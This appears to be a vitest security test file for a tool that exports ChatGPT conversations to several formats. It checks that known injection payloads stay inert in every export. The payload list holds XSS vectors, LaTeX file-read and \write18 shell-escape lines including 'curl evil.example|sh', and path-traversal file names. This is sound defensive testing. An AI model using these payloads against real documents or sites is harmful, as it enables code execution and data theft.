// Known attack payloads inside chat messages. None may become active content in any export.
import { describe, expect, it } from 'vitest';
import { adapterForSite } from '../../src/adapters/registry';
import { buildConversation } from '../../src/export-flow';
import { exportFileName } from '../../src/exporters/filename';
import { renderExport } from '../../src/exporters/index';
import { DEFAULT_OPTIONS, type ExportOptions } from '../../src/exporters/options';

const PAYLOADS = [
  `<img src=x onerror="alert('img')">`,
  `<svg onload="alert('svg')"><script>alert('svg-script')</script></svg>`,
  `<a href="javascript:alert('js')">click js</a>`,
  `<a href="  JaVaScRiPt:alert('mixed')">click mixed</a>`,
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click data</a>`,
  `<a href="vbscript:msgbox(1)">click vb</a>`,
  `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" alt="svg image">`,
  `<iframe src="https://evil.example/"></iframe>`,
  `<form action="https://evil.example/"><input name=q value=stolen></form>`,
  `<p style="background:url(javascript:alert(1))">styled text</p>`,
  `<p>&lt;script&gt;alert('escaped')&lt;/script&gt;</p>`,
  `<p>[markdown link](javascript:alert('md'))</p>`,
  `<p>&lt;javascript:alert('autolink')&gt;</p>`,
  `<p>]]&gt;&lt;/w:t&gt;&lt;/w:r&gt;&lt;w:r&gt;&lt;w:t&gt;xml break</p>`,
  `<p>\\end{document}\\input{/etc/passwd}</p>`,
  `<span class="katex"><span class="katex-mathml"><math><semantics><mi>x</mi><annotation encoding="application/x-tex">\\immediate\\write18{curl evil.example|sh}</annotation></semantics></math></span></span>`,
  `<pre><code>\\end{lstlisting}\\input{/etc/shadow}</code></pre>`,
  `<p>&#x202E;txt.exe</p>`,
];

function exportAll(html: string, opts: Partial<ExportOptions> = {}) {
  const doc = new DOMParser().parseFromString(
    `<html><head><title>x</title></head><body><main><div data-message-author-role="assistant"><div class="markdown">${html}</div></div></main></body></html>`,
    'text/html',
  );
  const url = new URL('https://chatgpt.com/c/attack');
  const adapter = adapterForSite('chatgpt', { doc, url });
  const conv = buildConversation(
    doc,
    url,
    adapter,
    adapter.turns().map((t) => adapter.read(t)),
  );
  const out: Record<string, string> = {};
  for (const f of ['md', 'html', 'txt', 'tex', 'json'] as const)
    out[f] = renderExport(conv, f, { ...DEFAULT_OPTIONS, images: 'link', ...opts }) as string;
  return out;
}

describe('attack payloads in messages', () => {
  for (const payload of PAYLOADS) {
    it(`stays inert: ${payload.slice(0, 60)}`, () => {
      const out = exportAll(payload);
      const html = new DOMParser().parseFromString(out.html!, 'text/html');
      expect(html.querySelectorAll('script, iframe, object, embed, form, input').length).toBe(0);
      for (const el of Array.from(html.querySelectorAll('*'))) {
        for (const a of Array.from(el.attributes)) {
          expect(a.name, `event handler on ${el.localName}`).not.toMatch(/^on/i);
          if (a.name === 'href' || a.name === 'src')
            expect(a.value).toMatch(/^(https?:|mailto:|data:image\/(png|jpe?g|gif|webp);)/);
          if (a.name === 'style') expect(a.value).not.toMatch(/url\(|expression/i);
        }
      }
      // Markdown: no live HTML and no javascript:/data: link targets.
      // (A backslash-escaped "\<" or "\]" is literal text in Markdown, not markup.)
      expect(out.md).not.toMatch(/(?<!\\)<(script|iframe|img|svg|a)\b/i);
      expect(out.md).not.toMatch(/(?<!\\)\]\((javascript|vbscript|data):/i);
      // LaTeX: no file or shell primitive survives outside listings (printed verbatim), and
      // listings cannot be closed early.
      const tex = out
        .tex!.replace(/\\backslash\\mathtt\{\w+\}/g, '')
        .replace(/\\begin\{lstlisting\}[\s\S]*?\\end\{lstlisting\}/g, '');
      expect(tex).not.toMatch(/\\(write18|immediate|input|include|openin|openout|directlua)(?![a-zA-Z])/);
      expect(tex.match(/\\end\{lstlisting\}/g)?.length ?? 0).toBe(
        tex.match(/\\begin\{lstlisting\}/g)?.length ?? 0,
      );
      expect(() => JSON.parse(out.json!)).not.toThrow();
    });
  }

  it('never writes an unsafe image address, even with image links on', () => {
    const out = exportAll(
      `<img src="data:image/svg+xml;base64,PHN2Zz4=" alt="a"><img src="javascript:alert(1)" alt="b">`,
    );
    expect(out.md).not.toContain('data:image/svg');
    expect(out.md).not.toContain('javascript:');
    expect(out.html).not.toContain('data:image/svg');
  });

  it('keeps file names inert', () => {
    const d = new Date(2026, 0, 1);
    for (const title of [
      '../../etc/passwd',
      '..\\..\\windows\\system32',
      'CON',
      'aux.txt',
      ' . . ',
      'a'.repeat(500),
      'name\u0000with\u0007nul',
    ]) {
      const name = exportFileName('chatgpt', title, d, 'md');
      expect(name).not.toMatch(/[\\/:*?"<>|]|\.\./);
      // eslint-disable-next-line no-control-regex -- checking control characters are gone
      expect(name).not.toMatch(/[\u0000-\u001f]/);
      expect(Array.from(name).length).toBeLessThan(110);
    }
  });
});
